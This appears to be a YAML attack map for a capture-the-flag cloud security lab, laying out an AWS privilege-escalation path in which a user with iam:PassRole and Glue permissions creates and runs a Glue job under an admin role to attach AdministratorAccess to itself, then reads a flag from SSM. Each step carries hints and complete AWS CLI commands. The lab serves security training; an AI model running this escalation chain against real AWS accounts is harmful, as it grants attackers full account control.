attackMap:
  nodes:
    - id: starting-user
      label: "Starting User"
      type: principal
      subType: iam-user
      arn: "arn:aws:iam::{account_id}:user/pl-prod-glue-003-to-admin-starting-user"
      access:
        type: assumed-breach-credentials
      description: >
        You have gained access to this principal's AWS IAM credentials. These could
        have been obtained through many real-world vectors: phishing a developer and
        gaining access to their workstation, compromising a browser session, exploiting
        a vulnerable workload running in this AWS account, discovering credentials in
        a public S3 bucket, or finding them hardcoded in source code or a CI/CD pipeline.

        Regardless of how you obtained them, you are now operating as this principal.
        This IAM user has iam:PassRole on the admin target role, glue:CreateJob, and
        glue:StartJobRun permissions. These permissions together allow you to create
        a Glue Python shell job that runs arbitrary code under the admin role and
        modifies IAM permissions on your behalf.

    - id: glue-job
      label: "Glue Job"
      type: resource
      subType: glue-job
      arn: "arn:aws:glue:{region}:{account_id}:job/pl-glue-003-privesc-job"
      description: >
        An AWS Glue Python shell job created by the attacker with a malicious Python
        script. The job is configured to run under the administrative target role,
        meaning any boto3 calls within the script execute with full admin permissions.
        The malicious script attaches AdministratorAccess to the starting user.

    - id: target-role
      label: "Admin Target Role"
      type: principal
      subType: iam-role
      isAdmin: true
      arn: "arn:aws:iam::{account_id}:role/pl-prod-glue-003-to-admin-target-role"
      description: >
        An IAM role with AdministratorAccess attached. This role is passed to the Glue
        job during creation. When the job executes, it assumes this role and runs the
        Python script with full administrative permissions in the account. The attacker
        gains effective admin access by having the job attach AdministratorAccess to
        the starting user — admin-equivalent permissions that are then used to read the
        scenario's CTF flag from SSM Parameter Store.

    - id: ctf-flag
      label: "CTF Flag"
      type: resource
      subType: ssm-parameter
      isTarget: true
      arn: "arn:aws:ssm:{region}:{account_id}:parameter/pathfinding-labs/flags/glue-003-to-admin"
      description: >
        The CTF flag for this scenario, stored as an SSM parameter in the victim account.
        Retrieving it requires administrator-equivalent permissions (ssm:GetParameter is
        granted implicitly by AdministratorAccess). Your goal is to read this parameter
        using the admin access gained from the previous step.

  edges:
    - from: starting-user
      to: glue-job
      label: "iam:PassRole + glue:CreateJob"
      description: >
        The starting user creates a Glue Python shell job, passing the admin role to it
        and providing a malicious Python script (hosted in S3) that will attach
        AdministratorAccess to the starting user when the job executes.
      hints:
        - "Create a Glue Python shell job passing the admin role as its execution role, pointing --command ScriptLocation at the malicious Python script already uploaded to S3 (path available in Terraform output). The script runs boto3 to call iam:AttachUserPolicy under the admin role."
        - "Browse to https://pathfinding.cloud/paths/glue-003 for technique details and the full attack flow."

      commands:
        - description: "Create a Glue Python shell job passing the admin role and specifying the malicious script in S3"
          command: >
            aws glue create-job
              --name pl-glue-003-privesc-job
              --role arn:aws:iam::{account_id}:role/pl-prod-glue-003-to-admin-target-role
              --command "Name=pythonshell,ScriptLocation=s3://{script_bucket}/{script_key},PythonVersion=3.9"
              --default-arguments '{"--job-language":"python"}'
              --max-capacity 0.0625
              --timeout 5

    - from: starting-user
      to: glue-job
      label: "glue:StartJobRun"
      description: >
        The starting user triggers execution of the Glue job. Once started, the job
        runs under the admin role and executes the Python code that grants the
        starting user administrative access.
      hints:
        - "Use glue:StartJobRun, then poll glue:GetJobRun until SUCCEEDED. Python shell jobs typically complete in 1-2 minutes; allow an additional ~15 seconds for IAM policy propagation before verifying with iam:ListAttachedUserPolicies."
      commands:
        - description: "Trigger the Glue job execution"
          command: "aws glue start-job-run --job-name pl-glue-003-privesc-job --output json"
        - description: "Poll job status using the JobRunId from the previous command"
          command: "aws glue get-job-run --job-name pl-glue-003-privesc-job --run-id <JobRunId> --query 'JobRun.JobRunState' --output text"

    - from: glue-job
      to: target-role
      label: "assumes role + iam:AttachUserPolicy"
      description: >
        The Glue job assumes the admin target role at execution time. All code within
        the job script runs with the permissions of this role. The Python script uses
        boto3 to attach the AdministratorAccess managed policy to the starting user,
        granting the attacker permanent admin access.
      hints: []
      commands:
        - description: "Check that AdministratorAccess is now attached to the starting user"
          command: "aws iam list-attached-user-policies --user-name pl-prod-glue-003-to-admin-starting-user --query 'AttachedPolicies[*].PolicyArn' --output text"
        - description: "Verify full administrator access"
          command: "aws iam list-users --max-items 3 --output table"

    - from: target-role
      to: ctf-flag
      label: "Read CTF flag"
      description: >
        With administrator-equivalent permissions now attached to the starting user,
        retrieve the scenario flag from SSM Parameter Store. AdministratorAccess grants
        ssm:GetParameter on all parameters in the account, so no additional permissions
        are needed beyond the admin access you just gained.
      hints:
        - "Use ssm:GetParameter with the full parameter path to retrieve the flag value."
      commands:
        - description: "Retrieve the CTF flag from SSM Parameter Store"
          command: "aws ssm get-parameter --name /pathfinding-labs/flags/glue-003-to-admin --query 'Parameter.Value' --output text"
